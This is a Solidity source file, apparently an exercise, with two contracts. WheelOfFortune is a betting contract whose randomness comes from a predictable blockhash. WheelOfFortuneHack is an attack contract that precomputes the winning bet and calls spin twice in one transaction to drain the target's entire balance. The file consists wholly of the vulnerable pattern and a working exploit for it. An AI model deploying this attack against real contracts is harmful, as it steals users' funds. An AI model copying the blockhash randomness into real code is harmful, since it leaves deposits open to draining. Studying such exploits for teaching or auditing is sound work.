pragma solidity ^0.8.20;

contract WheelOfFortune {
    Game[] public games;

    struct Game {
        address player;
        uint256 id;
        uint256 bet;
        uint256 blockNumber;
    }

    function spin(uint256 _bet) public payable {
        require(msg.value >= 0.01 ether);
        uint256 gameId = games.length;
        games.push(Game(msg.sender, gameId, _bet, block.number));
        if (gameId > 0) {
            uint256 lastGameId = gameId - 1;
            uint256 num = rand(blockhash(games[lastGameId].blockNumber), 100);
            if (num == games[lastGameId].bet) {
                payable(games[lastGameId].player).transfer(address(this).balance);
            }
        }
    }

    function rand(bytes32 hash, uint256 max) private pure returns (uint256 result) {
        return uint256(keccak256(abi.encodePacked(hash))) % max;
    }

    receive() external payable {}
}

contract WheelOfFortuneHack {
    WheelOfFortune public target;

    constructor(address payable _target) {
        target = WheelOfFortune(_target);
    }

    function attack() external payable {
        require(msg.value >= 0.02 ether, "Not enough ether to perform attack");
        uint256 bet = uint256(keccak256(abi.encodePacked(blockhash(block.number)))) % 100;
        target.spin{value: 0.01 ether}(bet);
        target.spin{value: 0.01 ether}(bet);
    }

    receive() external payable {}
}
